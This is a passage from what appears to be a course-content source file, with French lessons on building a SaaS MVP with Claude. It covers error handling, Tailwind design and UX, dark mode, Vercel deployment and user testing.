<p><code>// app/dashboard/error.tsx<br/>"use client"<br/><br/>export default function DashboardError({ error, reset }: { error: Error; reset: () =&gt; void }) {<br/>  return (<br/>    &lt;div className="text-center py-10"&gt;<br/>      &lt;h2&gt;Oups, quelque chose s'est mal passé&lt;/h2&gt;<br/>      &lt;p&gt;{error.message}&lt;/p&gt;<br/>      &lt;button onClick={reset}&gt;Réessayer&lt;/button&gt;<br/>    &lt;/div&gt;<br/>  );<br/>}</code></p>
<p>Pour le logging en production, ne te contente pas de <code>console.error</code>. Intègre un service de monitoring comme Sentry (gratuit pour les petits projets) qui te notifie par email quand une erreur survient, avec le contexte complet : quelle page, quel utilisateur, quelle requête, quelle stack trace. C'est indispensable pour corriger les bugs avant que tes utilisateurs ne se plaignent.</p>
<p><strong>Conseil pro :</strong> Affiche des messages d'erreur humains et rassurants. Au lieu de "Error 500: UNIQUE constraint failed: users.email", affiche "Cet email est déjà utilisé. Essaie de te connecter où utilise un autre email." Tes utilisateurs ne sont pas des développeurs — ils ont besoin de comprendre quoi faire, pas quel constraint a échoué.</p>
<p><strong>Attention :</strong> Ne silencieux jamais une erreur avec un <code>catch</code> vide. Le pire bug est celui que tu ne vois pas. Même si tu ne peux pas récupérer d'une erreur, log-la toujours pour pouvoir l'investiguer plus tard.</p>

<blockquote>Un backend bien structuré est invisible pour l'utilisateur, mais c'est la fondation de tout ton produit. Prends le temps de poser des bases solides — validation, gestion d'erreurs, structure cohérente — et tout le reste sera plus facile à construire et à maintenir.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Demande à Claude : "Crée un schéma Prisma pour un SaaS de gestion de factures avec les modèles User, Client, Invoice et InvoiceItem. Ajoute les relations et les champs nécessaires." Analyse le schéma généré et vérifie que les relations sont cohérentes.</li>
<li>Demande à Claude : "Génère les Route Handlers CRUD complets pour le modèle Invoice : GET (liste et détail), POST, PUT, DELETE, avec validation Zod et gestion d'erreurs." Lis chaque handler et identifie les étapes : validation, requête Prisma, réponse.</li>
<li>Demande à Claude : "Transforme le Route Handler POST /api/invoices en Server Action avec revalidation du dashboard." Compare les deux versions et note les différences.</li>
<li>Crée un schéma Zod pour valider les données d'un formulaire de contact (nom, email, message, budget optionnel). Demande à Claude de l'intégrer dans une Server Action avec des messages d'erreur en français.</li>
<li>Demande à Claude : "Crée un composant error.tsx pour le dashboard qui affiche un message d'erreur convivial avec un bouton pour réessayer et un lien pour contacter le support." Vérifie que le composant utilise la directive "use client".</li>
</ol>`,
  },
  // ─── Lesson 44 : Design, UX et polish avec Claude ───
  {
    order: 44,
    module: 5,
    title: "Design, UX et polish avec Claude",
    slug: "design-ux-polish-claude",
    duration: "50 min",
    description: "Transformer ton MVP fonctionnel en un produit agréable à utiliser grâce au design, à l'UX et aux finitions visuelles.",
    content: `<h2>Le design compte plus que tu ne le crois</h2>
<p>Tu as peut-être entendu la phrase "le contenu est roi". C'est vrai, mais dans le monde du SaaS, le design est le premier ministre. Un utilisateur met environ 50 millisecondes pour se faire une première impression de ton site. Moins d'une seconde. Si ton MVP ressemble à un projet de fin d'études des années 2000, personne ne prendra ton produit au sérieux — même si la technologie derrière est brillante.</p>
<p>Le design influence directement trois métriques critiques pour ton business :</p>
<ul>
<li><strong>La conversion</strong> : Une landing page bien designée convertit 2 à 5 fois plus qu'une page négligée. Les visiteurs jugent ta crédibilité en un coup d'oeil. Un design professionnel dit "ce produit est sérieux, l'équipe derrière sait ce qu'elle fait". Un design amateur dit "ce projet est peut-être abandonné, est-ce que mes données sont en sécurité ici ?".</li>
<li><strong>La confiance</strong> : Les utilisateurs associent inconsciemment la qualité visuelle à la qualité technique. Un bouton mal aligné, une couleur qui jure, une typographie incohérente — chaque détail négligé érode la confiance. Et sans confiance, pas d'inscription, pas de paiement, pas de rétention.</li>
<li><strong>La rétention</strong> : Un produit agréable à utiliser est un produit qu'on utilise. Si tes utilisateurs trouvent l'interface intuitive et plaisante, ils reviennent. Si chaque interaction est une friction — un formulaire confus, un bouton trop petit, un feedback absent — ils finissent par aller voir chez le concurrent.</li>
</ul>
<p>La bonne nouvelle, c'est que tu n'as pas besoin d'être designer pour créer un MVP qui a l'air professionnel. Avec Tailwind CSS, quelques principes UX et Claude Code qui connaît les bonnes pratiques, tu peux atteindre un niveau de qualité visuelle qui impressionne. L'objectif n'est pas de gagner un prix de design — c'est de ne pas perdre des utilisateurs à cause d'une interface qui leur fait fuir.</p>
<p><strong>Conseil pro :</strong> Avant de coder, passe 30 minutes sur des sites comme Dribbble, Mobbin où les showcases de Tailwind UI. Regarde comment les meilleurs SaaS présentent leurs interfaces. Prends des captures d'écran de ce qui te plaît. Tu pourras montrer ces références à Claude : "Fais-moi un dashboard qui ressemble à ce style." Claude est excellent pour reproduire des styles visuels à partir d'exemples.</p>
<p><strong>Astuce :</strong> Le minimalisme est ton allié. En cas de doute, enlève plutôt qu'ajoute. Un design simple avec beaucoup d'espace blanc, une typographie propre et deux couleurs bien choisies sera toujours plus professionnel qu'un design surchargé avec dix couleurs et des effets partout.</p>

<h2>Les principes UX fondamentaux</h2>
<p>L'UX (User Expérience) ne se résume pas au visuel. C'est l'ensemble de l'expérience que vit ton utilisateur quand il interagit avec ton produit. Un bon UX suit une pyramide de besoins, inspirée de la pyramide de Maslow :</p>
<p><strong>Niveau 1 — Fonctionnel :</strong> Ton produit fait ce qu'il promet. Si tu vends un outil de facturation, l'utilisateur peut créer et envoyer des factures. C'est le minimum vital. Ça semble évident, mais beaucoup de MVP échouent à ce niveau : des bugs qui empêchent de terminer un flux, des fonctionnalités qui ne marchent qu'à moitié.</p>
<p><strong>Niveau 2 — Fiable :</strong> Ton produit fonctionne de manière constante. Pas de crashes aléatoires, pas de données qui disparaissent, pas de pages qui mettent 10 secondes à charger. L'utilisateur peut compter sur ton outil au quotidien. Un SaaS qui plante une fois sur trois détruit la confiance.</p>
<p><strong>Niveau 3 — Utilisable :</strong> Ton produit est facile à utiliser sans mode d'emploi. L'utilisateur trouve ce qu'il cherche intuitivement, les actions sont claires, le feedback est immédiat. Ce niveau repose sur des conventions bien établies : le logo en haut à gauche ramène à l'accueil, un bouton bleu est une action principale, une icône de poubelle signifie supprimer.</p>
<p><strong>Niveau 4 — Agréable :</strong> Ton produit procure du plaisir. Des animations fluides, des micro-interactions satisfaisantes, un ton de voix chaleureux dans les messages. C'est ce qui transforme un utilisateur en ambassadeur — il recommande ton produit parce qu'il aime l'utiliser, pas seulement parce qu'il en a besoin.</p>
<p>Quelques règles UX concrètes à appliquer dès maintenant dans ton MVP :</p>
<ul>
<li><strong>La règle des 3 clics</strong> : L'utilisateur doit pouvoir atteindre n'importe quelle fonctionnalité en 3 clics maximum depuis la page principale.</li>
<li><strong>Le feedback immédiat</strong> : Chaque action de l'utilisateur doit avoir une réponse visuelle. Un clic sur un bouton affiche un spinner, une soumission réussie affiche un toast de confirmation, une erreur affiche un message explicatif.</li>
<li><strong>La cohérence</strong> : Les mêmes éléments doivent avoir le même comportement partout. Si un bouton bleu signifie "action principale" sur une page, il doit signifier la même chose sur toutes les pages.</li>
<li><strong>Les états vides</strong> : Quand une liste est vide (pas encore de projets, pas de factures), affiche un message accueillant avec un appel à l'action clair : "Tu n'as pas encore de projet. Crée ton premier projet en un clic."</li>
</ul>
<p><strong>Attention :</strong> L'erreur classique du développeur-entrepreneur, c'est de négliger les "edge cases" UX : l'état de chargement, l'état d'erreur, l'état vide, l'état avec trop de données. Un bon UX couvre tous ces cas. Demande à Claude : "Gère les états loading, error et empty pour ce composant" — il sait exactement quoi faire.</p>

<h2>Tailwind CSS : les bonnes pratiques</h2>
<p>Tu connais déjà Tailwind CSS, mais il y à une différence entre utiliser Tailwind et bien utiliser Tailwind. Voici les pratiques qui feront passer ton interface de "ça marché" à "c'est professionnel".</p>
<p><strong>L'espacement cohérent</strong></p>
<p>L'espacement est ce qui donne du rythme à une interface. Tailwind utilise une échelle de 4px : <code>p-1</code> = 4px, <code>p-2</code> = 8px, <code>p-4</code> = 16px, <code>p-6</code> = 24px, <code>p-8</code> = 32px. La règle d'or : utilise 3-4 valeurs maximum dans ton projet. Par exemple : <code>p-4</code> pour le padding standard, <code>p-6</code> pour les sections, <code>gap-3</code> entre les éléments d'une liste, <code>space-y-8</code> entre les sections d'une page.</p>
<p><strong>La palette de couleurs</strong></p>
<p>Limite-toi à une couleur primaire (ton identité), une couleur de succès (vert), une couleur de danger (rouge) et des gris pour le texte et les fonds. Tailwind offre des nuances de 50 à 950 pour chaque couleur. Utilise les nuances claires (50-100) pour les fonds, les nuances moyennes (500-600) pour les éléments interactifs et les nuances sombres (700-900) pour le texte :</p>
<ul>
<li>Fond principal : <code>bg-white</code> où <code>bg-gray-50</code></li>
<li>Texte principal : <code>text-gray-900</code></li>
<li>Texte secondaire : <code>text-gray-500</code></li>
<li>Bouton principal : <code>bg-blue-600 hover:bg-blue-700</code></li>
<li>Fond de carte : <code>bg-white border border-gray-200</code></li>
</ul>
<p><strong>La typographie</strong></p>
<p>Utilise 2 tailles maximum pour le corps du texte (<code>text-sm</code> et <code>text-base</code>), et les variantes <code>text-lg</code> à <code>text-3xl</code> pour les titres. Le <code>font-medium</code> est souvent plus élégant que le <code>font-bold</code> pour les labels et les sous-titres. Ajoute <code>leading-relaxed</code> aux paragraphes de texte long pour améliorer la lisibilité.</p>
<p><strong>Les tokens de design avec @apply</strong></p>
<p>Pour éviter de répéter les mêmes combinaisons de classes partout, crée des composants réutilisables. Si tu as un style de bouton utilisé 20 fois, crée un composant <code>Button</code> plutôt que de copier-coller <code>bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors font-medium</code> partout. C'est plus maintenable et plus cohérent.</p>
<p><strong>Astuce :</strong> Demande à Claude : "Crée-moi un fichier de composants UI réutilisables : Button (primary, secondary, danger), Card, Badge, Input, Select." Tu auras une base de composants cohérente que tu peux utiliser dans tout ton projet. C'est l'équivalent d'un mini design system.</p>

<h2>Le responsive design</h2>
<p>Plus de 60 % du trafic web mondial vient du mobile. Si ton MVP n'est pas utilisable sur un smartphone, tu perds la majorité de tes utilisateurs potentiels. Le responsive design, c'est l'art de faire en sorte que ton interface s'adapte à toutes les tailles d'écran — du smartphone au moniteur ultrawide.</p>
<p>Tailwind adopte une approche "mobile-first" : les classes sans préfixe s'appliquent au mobile, et tu ajoutes des préfixes pour les écrans plus grands :</p>
<ul>
<li><code>sm:</code> — à partir de 640px (grands smartphones, petites tablettes)</li>
<li><code>md:</code> — à partir de 768px (tablettes)</li>
<li><code>lg:</code> — à partir de 1024px (petits écrans desktop)</li>
<li><code>xl:</code> — à partir de 1280px (écrans desktop standard)</li>
</ul>
<p>Exemple concret — une grille de cartes qui s'adapte :</p>
<p><code>&lt;div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6"&gt;</code></p>
<p>Sur mobile : 1 colonne. Sur tablette : 2 colonnes. Sur desktop : 3 colonnes. En une seule ligne de classes.</p>
<p>Voici les règles essentielles du responsive pour un MVP :</p>
<ul>
<li><strong>Le menu de navigation</strong> : Sur desktop, un menu horizontal. Sur mobile, un menu hamburger. Claude sait générer ce pattern — demande-lui un "responsive navbar with mobile hamburger menu".</li>
<li><strong>Les tableaux</strong> : Sur desktop, un tableau classique. Sur mobile, transforme chaque ligne en carte empilée. Les tableaux horizontaux sont illisibles sur un petit écran.</li>
<li><strong>Les formulaires</strong> : Sur desktop, les champs peuvent être côte à côte. Sur mobile, empile-les verticalement. Utilise <code>flex flex-col md:flex-row</code>.</li>
<li><strong>Les tailles de texte</strong> : Un titre en <code>text-4xl</code> est impressionnant sur desktop mais écrasant sur mobile. Utilise <code>text-2xl md:text-4xl</code>.</li>
<li><strong>Les boutons et zones cliquables</strong> : Sur mobile, la cible minimum est 44x44 pixels. Un bouton trop petit est une source de frustration majeure sur tactile.</li>
</ul>
<p><strong>Conseil pro :</strong> Teste toujours sur un vrai téléphone, pas seulement dans l'inspecteur du navigateur. L'inspecteur ne reproduit pas les subtilités du tactile : la taille des doigts, le scroll inertiel, le comportement du clavier virtuel qui pousse le contenu vers le haut. Utilise le partage réseau local de Next.js (<code>--hostname 0.0.0.0</code>) pour accéder à ton app de développement depuis ton téléphone.</p>

<h2>Les animations et micro-interactions</h2>
<p>Les animations ne sont pas du décor — elles guident l'attention de l'utilisateur et rendent l'interface plus intuitive. Quand un élément apparaît en fondu plutôt que brutalement, le cerveau de l'utilisateur comprend mieux ce qui s'est passé. Quand un bouton à un effet au survol, l'utilisateur sait qu'il est interactif. C'est du feedback visuel qui améliore l'expérience.</p>
<p>Tailwind offre des transitions CSS natives très simples :</p>
<ul>
<li><code>transition-colors duration-200</code> : Les changements de couleur sont animés (parfait pour les hover states de boutons).</li>
<li><code>transition-all duration-300</code> : Toutes les propriétés sont animées (taille, couleur, position).</li>
<li><code>hover:scale-105 transition-transform</code> : L'élément grossit légèrement au survol (efficace pour les cartes cliquables).</li>
</ul>
<p>Pour des animations plus sophistiquées, Framer Motion est la librairie de référence dans l'écosystème React. Elle te permet de créer des animations déclaratives avec une syntaxe simple :</p>
<p><code>import { motion } from "framer-motion";<br/><br/>&lt;motion.div<br/>  initial={{ opacity: 0, y: 20 }}<br/>  animate={{ opacity: 1, y: 0 }}<br/>  transition={{ duration: 0.3 }}<br/>&gt;<br/>  Contenu qui apparaît en glissant vers le haut<br/>&lt;/motion.div&gt;</code></p>
<p>Les micro-interactions les plus importantes pour un MVP :</p>
<ul>
<li><strong>Les états de chargement</strong> : Un spinner où un skeleton screen pendant que les données se chargent. Ne laisse jamais un écran vide où figé — l'utilisateur doit toujours savoir que quelque chose se passe.</li>
<li><strong>Les toasts de confirmation</strong> : Un petit message qui apparaît en haut où en bas de l'écran après une action réussie : "Projet créé avec succès." Utilise une librairie comme <code>sonner</code> où <code>react-hot-toast</code>.</li>
<li><strong>Les transitions de page</strong> : Un léger fondu entre les pages donne une impression de fluidité et de polish.</li>
<li><strong>Le bouton qui réagit</strong> : Un bouton qui affiche un spinner pendant le chargement et se désactive pour empêcher les doubles clics.</li>
</ul>
<p><strong>Attention :</strong> La règle d'or des animations : si tu ne peux pas justifier pourquoi une animation existe, supprime-la. Une animation qui ralentit l'utilisateur où qui est simplement "cool" sans raison est un gaspillage. L'animation doit servir l'UX, pas l'ego du designer.</p>
<p><strong>Astuce :</strong> Demande à Claude : "Ajoute des animations subtiles à ce composant : entrée en fondu, hover effects sur les cartes, et un skeleton loading." Claude génère des animations élégantes et performantes sans que tu aies à maîtriser les keyframes CSS où l'API de Framer Motion.</p>

<h2>Le dark mode</h2>
<p>Le dark mode n'est plus un luxe — c'est une attente des utilisateurs. Environ 80 % des utilisateurs de smartphones activent le mode sombre, et de plus en plus d'applications desktop le proposent. Pour un SaaS, offrir un dark mode est un signal de qualité qui dit "ce produit est moderne et soigné". Et avec Tailwind CSS, l'implémentation est remarquablement simple.</p>
<p>Tailwind propose un préfixe <code>dark:</code> qui applique des styles conditionnellement quand le dark mode est actif :</p>
<p><code>&lt;div className="bg-white dark:bg-gray-900 text-gray-900 dark:text-gray-100"&gt;<br/>  &lt;p className="text-gray-600 dark:text-gray-400"&gt;Texte secondaire&lt;/p&gt;<br/>  &lt;button className="bg-blue-600 dark:bg-blue-500 text-white"&gt;Action&lt;/button&gt;<br/>&lt;/div&gt;</code></p>
<p>Il y a deux stratégies pour déclencher le dark mode :</p>
<ul>
<li><strong>Automatique via <code>prefers-color-scheme</code></strong> : Le dark mode suit le réglage système de l'utilisateur. Si son OS est en mode sombre, ton site l'est aussi. C'est le comportement par défaut de Tailwind avec <code>darkMode: "media"</code> dans la config.</li>
<li><strong>Toggle manuel</strong> : L'utilisateur choisit lui-même via un bouton dans l'interface. Configure Tailwind avec <code>darkMode: "class"</code> et ajoute/retire la classe <code>dark</code> sur la balise <code>&lt;html&gt;</code>. Plus de contrôle, meilleure expérience.</li>
</ul>
<p>Pour un MVP, la stratégie recommandée est le toggle manuel avec détection du réglage système comme valeur par défaut. Stocke la préférence dans <code>localStorage</code> pour qu'elle persiste entre les sessions :</p>
<p><code>// Vérifie la préférence stockée, sinon utilise le réglage système<br/>const theme = localStorage.getItem("theme") || (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");<br/>document.documentElement.classList.toggle("dark", theme === "dark");</code></p>
<p>Les pièges courants du dark mode :</p>
<ul>
<li><strong>Les images et logos</strong> : Un logo noir sur fond blanc devient invisible sur fond sombre. Prévois des versions claires de tes assets où utilise des SVG avec <code>fill="currentColor"</code> pour qu'ils s'adaptent automatiquement.</li>
<li><strong>Les ombres</strong> : Les <code>box-shadow</code> sont invisibles en dark mode. Utilise des bordures subtiles (<code>dark:border-gray-700</code>) pour délimiter les éléments à la place.</li>
<li><strong>Le contraste</strong> : Le texte gris clair qui est lisible sur fond blanc peut être illisible sur fond sombre. Vérifie toujours le contraste dans les deux modes.</li>
<li><strong>Le flash blanc</strong> : Si le dark mode est initialisé côté client, l'utilisateur voit un flash blanc au chargement. Utilise un script inline dans le <code>&lt;head&gt;</code> pour appliquer la classe <code>dark</code> avant le rendu.</li>
</ul>
<p><strong>Conseil pro :</strong> Ne traite pas le dark mode comme un ajout en fin de projet. Si tu l'intègres dès le début, tu ajoutes les classes <code>dark:</code> au fur et à mesure — c'est presque transparent. Si tu l'ajoutes à la fin, tu dois reprendre chaque composant un par un. Dis à Claude dès le départ : "Tous les composants doivent supporter le dark mode avec les classes Tailwind dark:".</p>

<blockquote>Le design n'est pas ce à quoi ça ressemble. Le design, c'est comment ça fonctionne. Un MVP bien designé n'a pas besoin d'être spectaculaire — il a besoin d'être clair, cohérent et agréable à utiliser. C'est ce qui transforme un visiteur curieux en utilisateur fidèle.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Demande à Claude : "Crée-moi un design system minimal avec les composants suivants en Tailwind CSS : Button (primary, secondary, outline, danger avec tailles sm/md/lg), Card, Badge (success, warning, error, info), Input avec label et message d'erreur." Utilise ces composants dans au moins une page de ton MVP.</li>
<li>Prends une page de ton MVP et rends-la entièrement responsive. Teste-la en redimensionnant le navigateur et vérifie que la navigation, les formulaires et les grilles s'adaptent correctement à mobile, tablette et desktop.</li>
<li>Demande à Claude : "Ajoute des animations Framer Motion à ma page dashboard : les cartes de stats apparaissent en stagger (une après l'autre), les éléments de liste glissent depuis la gauche, et les boutons ont un effet de press (scale down au clic)."</li>
<li>Implémente le dark mode dans ton MVP. Configure Tailwind en mode "class", crée un composant ThemeToggle avec une icône soleil/lune, et ajoute les classes <code>dark:</code> à tes composants principaux.</li>
<li>Fais un audit UX rapide de ton MVP : identifie 3 endroits où il manque un état de chargement, 3 endroits où un message d'erreur serait utile, et 3 endroits où un "état vide" améliorerait l'expérience. Demande à Claude de les implémenter.</li>
</ol>`,
  },
  // ─── Lesson 45 : Déployer, tester et itérer ton MVP ───
  {
    order: 45,
    module: 5,
    title: "Déployer, tester et itérer ton MVP",
    slug: "déployer-tester-iterer-mvp",
    duration: "55 min",
    description: "Lancer ton MVP en production, le tester avec de vrais utilisateurs et itérer rapidement pour trouver le product-market fit.",
    content: `<h2>Le jour du lancement</h2>
<p>Tu y es. Après des semaines de travail — l'idéation, la validation, l'apprentissage technique, le coding avec Claude — ton MVP est prêt à voir le jour. C'est un moment grisant, un mélange d'excitation et de nervosité. Et c'est normal. Chaque entrepreneur ressent ça au moment de mettre son produit entre les mains de vrais utilisateurs. Mais retiens une chose essentielle : un MVP lancé imparfait vaut infiniment mieux qu'un produit parfait qui ne voit jamais le jour.</p>
<p>Le lancement de ton MVP n'est pas la ligne d'arrivée — c'est la ligne de départ. C'est le moment où tu passes de la théorie à la réalité, où les hypothèses deviennent des données concrètes. Tu vas découvrir des choses que tu n'avais pas anticipées : des utilisateurs qui utilisent ton produit d'une manière que tu n'avais pas imaginée, des fonctionnalités que tu pensais essentielles et que personne n'utilise, des besoins que tu n'avais pas identifiés.</p>
<p>Avant de déployer, prends un moment pour vérifier que les fondamentaux sont en place :</p>
<ul>
<li><strong>La proposition de valeur est claire</strong> : Un visiteur comprend en 5 secondes ce que fait ton produit et pourquoi c'est utile.</li>
<li><strong>Le flux principal fonctionne</strong> : L'utilisateur peut accomplir la tâche principale de bout en bout sans bug bloquant.</li>
<li><strong>L'inscription et la connexion marchent</strong> : Le parcours d'onboarding est fluide, les emails de confirmation arrivent.</li>
<li><strong>Les paiements sont testés</strong> : Si tu as une version payante, le flux Stripe fonctionne en mode test et en mode production.</li>
<li><strong>Les données sont sauvegardées</strong> : Tout ce que l'utilisateur crée est bien persisté en base de données et récupérable.</li>
</ul>
<p><strong>Astuce :</strong> Ne vise pas la perfection. Reid Hoffman, le fondateur de LinkedIn, a dit une phrase devenue culte dans le monde startup : si tu n'as pas un peu honte de la première version de ton produit, c'est que tu as lancé trop tard. L'objectif du MVP, c'est d'apprendre le plus vite possible, pas d'impressionner.</p>
<p><strong>Conseil pro :</strong> Crée un document "Known Issues" où tu listes les bugs que tu connais mais que tu as décidé de ne pas corriger avant le lancement. Ça te permettra de prioriser les corrections après le lancement en fonction du feedback réel des utilisateurs, plutôt que de tes suppositions.</p>

<h2>La checklist de pré-lancement</h2>
<p>Avant d'appuyer sur le bouton de déploiement, passe en revue cette checklist. Chaque élément a été responsable de lancements ratés quand il a été négligé. Prends le temps de vérifier chaque point — 30 minutes de vérification maintenant peuvent t'éviter des heures de debugging en urgence après le lancement.</p>
<p><strong>Variables d'environnement</strong></p>
<ul>
<li>Toutes les clés API sont configurées en production (Stripe, Resend, base de données, etc.).</li>
<li>Les clés de production (pas les clés de test) sont utilisées pour Stripe et les services de paiement.</li>
<li>La <code>DATABASE_URL</code> pointe vers la base de données de production, pas celle de développement.</li>
<li>Les secrets sensibles ne sont jamais exposés dans le code source où les logs.</li>
</ul>
<p><strong>Base de données</strong></p>
<ul>
<li>Les migrations sont appliquées sur la base de production.</li>
<li>Les données de test sont nettoyées (pas de "Test User" où "aaa@bbb.com" visibles).</li>
<li>Les index sont en place pour les requêtes fréquentes (recherche par email, tri par date).</li>
</ul>
<p><strong>Sécurité et HTTPS</strong></p>
<ul>
<li>Le site est accessible en HTTPS (Vercel le gère automatiquement).</li>
<li>Les formulaires ont une validation côté serveur.</li>
<li>L'authentification protège les routes privées (dashboard, settings, API).</li>
<li>Les headers de sécurité sont configurés (Content-Security-Policy, X-Frame-Options).</li>
</ul>
<p><strong>Domaine et SEO</strong></p>
<ul>
<li>Le nom de domaine est connecté et fonctionnel.</li>
<li>Les balises <code>&lt;title&gt;</code> et <code>&lt;meta description&gt;</code> sont renseignées pour chaque page.</li>
<li>Un fichier <code>robots.txt</code> et un <code>sitemap.xml</code> sont en place.</li>
<li>L'Open Graph (og:image, og:title) est configuré pour un bel affichage quand le lien est partagé sur les réseaux sociaux.</li>
</ul>
<p><strong>Analytics et monitoring</strong></p>
<ul>
<li>Un outil d'analytics est installé (Vercel Analytics, Plausible où PostHog).</li>
<li>Un outil de monitoring d'erreurs est configuré (Sentry).</li>
<li>Tu reçois une notification quand une erreur critique survient.</li>
</ul>
<p><strong>Tests essentiels</strong></p>
<ul>
<li>Le flux d'inscription fonctionne de A à Z.</li>
<li>Le flux de paiement fonctionne en mode production.</li>
<li>L'application s'affiche correctement sur mobile.</li>
<li>Les emails transactionnels arrivent bien (vérifie aussi les dossiers spam).</li>
</ul>
<p><strong>Attention :</strong> La cause numéro 1 de bug au lancement, c'est une variable d'environnement manquante où incorrecte. Vérifie chaque variable deux fois. Vercel affiche clairement les variables d'environnement dans les settings de ton projet — compare-les avec ton fichier <code>.env</code> local.</p>

<h2>Le déploiement final</h2>
<p>Vercel est la plateforme de déploiement de référence pour les applications Next.js. Le processus est simple, rapide et fiable. Si tu as suivi les leçons précédentes, ton code est déjà sur GitHub. Le déploiement se fait en quelques étapes.</p>
<p><strong>Étape 1 : Connecter ton repository</strong></p>
<p>Va sur vercel.com, connecte-toi avec ton compte GitHub et clique sur "Import Project". Sélectionne le repository de ton MVP. Vercel détecte automatiquement que c'est un projet Next.js et configure les paramètres de build.</p>
<p><strong>Étape 2 : Configurer les variables d'environnement</strong></p>
<p>Avant de lancer le build, ajoute toutes tes variables d'environnement dans l'interface de Vercel : DATABASE_URL, STRIPE_SECRET_KEY, RESEND_API_KEY, NEXTAUTH_SECRET, etc. Vercel les chiffre et les injecte au moment du build et à l'exécution.</p>
<p><strong>Étape 3 : Lancer le build</strong></p>
<p>Clique sur "Deploy". Vercel exécute <code>npm run build</code>, qui compile ton application Next.js. Tu verras les logs de build en temps réel. Si le build échoue, Vercel t'affiche les erreurs — généralement un import manquant, une erreur TypeScript où une variable d'environnement non définie.</p>
<p><strong>Étape 4 : Vérifier le déploiement</strong></p>
<p>Une fois le build réussi, Vercel te donne une URL de prévisualisation (genre <code>ton-projet-abc123.vercel.app</code>). Ouvre-la, teste les flux principaux. Si tout fonctionne, tu peux connecter ton domaine personnalisé.</p>
<p><strong>Étape 5 : Connecter le domaine</strong></p>
<p>Dans les settings de ton projet Vercel, va dans "Domains" et ajoute ton nom de domaine. Vercel te donnera les enregistrements DNS à configurer chez ton registrar (Namecheap, OVH, Google Domains...). La propagation DNS peut prendre de quelques minutes à 48 heures, mais en pratique c'est souvent opérationnel en moins d'une heure.</p>
<p>À partir de maintenant, chaque <code>git push</code> sur ta branche principale déclenche automatiquement un nouveau déploiement. C'est la magie du déploiement continu : tu corriges un bug, tu fais un commit, tu pushes, et en 60 secondes ton fix est en production.</p>
<p><strong>Conseil pro :</strong> Active les "Preview Deployments" de Vercel. Chaque pull request crée automatiquement un environnement de prévisualisation avec sa propre URL. Tu peux tester tes modifications sans risquer de casser la production. C'est un workflow professionnel que même les grandes équipes utilisent.</p>

<h2>Tester avec de vrais utilisateurs</h2>
<p>Ton MVP est en ligne, mais le vrai travail commence maintenant. Tu dois mettre ton produit entre les mains de vrais utilisateurs et observer ce qui se passe. Pas tes amis qui vont te dire "c'est super" pour ne pas te vexer — de vrais utilisateurs potentiels qui ont le problème que tu prétends résoudre.</p>
<p>La règle d'or du test utilisateur : 5 testeurs suffisent pour identifier 85 % des problèmes d'usabilité. C'est un chiffre validé par des décennies de recherche UX. Tu n'as pas besoin de centaines de beta-testeurs — 5 personnes motivées et représentatives de ta cible te donneront une masse d'insights exploitables.</p>
<p><strong>Comment recruter tes beta-testeurs :</strong></p>
<ul>
<li>Ta liste d'attente email (si tu en as constitué une pendant la phase de validation).</li>
<li>Les communautés en ligne où se trouve ta cible (forums, groupes Facebook, serveurs Discord, Slack de niche).</li>
<li>Ton réseau LinkedIn — un post qui explique ce que tu construis et demande des volontaires.</li>
<li>Les groupes de beta-testing (BetaList, Product Hunt Ship).</li>
</ul>
<p><strong>Donne-leur des tâches concrètes à accomplir :</strong></p>
<p>Ne dis pas "teste mon app et dis-moi ce que tu en penses". C'est trop vague. Donne des scénarios précis : "Inscris-toi, crée un projet, ajoute 3 tâches, marque une tâche comme terminée, et exporte le rapport." Observe où ils bloquent, hésitent, où cliquent au mauvais endroit.</p>
<p><strong>Mets en place un système de tracking des bugs :</strong></p>
<ul>
<li>Un tableau Notion où un projet GitHub Issues pour centraliser tous les retours.</li>
<li>Pour chaque bug : description, étapes pour reproduire, screenshot, appareil et navigateur utilisés.</li>
<li>Catégorise les bugs : bloquant (l'utilisateur ne peut pas continuer), majeur (une fonctionnalité importante ne marché pas) où mineur (cosmétique, faute de frappe).</li>
</ul>
<p><strong>Astuce :</strong> Si possible, fais des sessions de test en direct (en visio) où tu observes l'utilisateur sans intervenir. Demande-lui de "penser à voix haute" — de dire ce qu'il essaie de faire, ce qu'il comprend où ne comprend pas. Ces sessions sont incroyablement riches en enseignements. Tu découvriras des problèmes d'UX que tu n'aurais jamais trouvés seul parce que tu connais trop bien ton propre produit.</p>

<h2>Collecter du feedback</h2>
<p>Les bugs sont faciles à identifier — soit ça marché, soit ça ne marché pas. Le feedback qualitatif, lui, est plus subtil et plus précieux. C'est ce qui te dit si ton produit résout vraiment le problème, si la proposition de valeur est claire, si le prix est juste, si les utilisateurs reviendraient.</p>
<p><strong>Les entretiens utilisateurs</strong></p>
<p>C'est la source de feedback la plus riche. Prends 20 minutes avec chaque beta-testeur pour poser des questions ouvertes. Les questions les plus révélatrices :</p>
<ul>
<li>"Qu'est-ce que tu as essayé de faire en premier ?" — révèle les attentes et les priorités.</li>
<li>"À quel moment tu as été bloqué où confus ?" — identifie les frictions UX.</li>
<li>"Qu'est-ce qui manque pour que tu utilises ça au quotidien ?" — priorise les prochaines fonctionnalités.</li>
<li>"Tu recommanderais ce produit à un collègue ? Pourquoi où pourquoi pas ?" — mesure la satisfaction globale.</li>
<li>"Combien tu serais prêt à payer pour ça ?" — valide ton modèle de prix.</li>
</ul>
<p><strong>Les formulaires in-app</strong></p>
<p>Intègre un moyen simple de donner du feedback directement dans l'application. Un bouton "Feedback" flottant où un widget comme Canny, Nolt où un simple formulaire Google Forms. L'idée est de capturer les retours au moment où l'utilisateur les pense, pas trois jours plus tard quand il a oublié les détails.</p>
<p><strong>Les analytics comportementales</strong></p>
<p>Les données quantitatives complètent le feedback qualitatif. Avec un outil comme PostHog, Mixpanel où même Vercel Analytics, tu peux suivre :</p>
<ul>
<li>Le taux de rebond de ta landing page (combien de visiteurs partent immédiatement).</li>
<li>Le taux de conversion inscription (combien de visiteurs créent un compte).</li>
<li>Le taux d'activation (combien d'inscrits accomplissent l'action clé — créer leur premier projet, par exemple).</li>
<li>La rétention (combien d'utilisateurs reviennent après 1 jour, 7 jours, 30 jours).</li>
</ul>
<p><strong>Les réseaux sociaux et le support</strong></p>
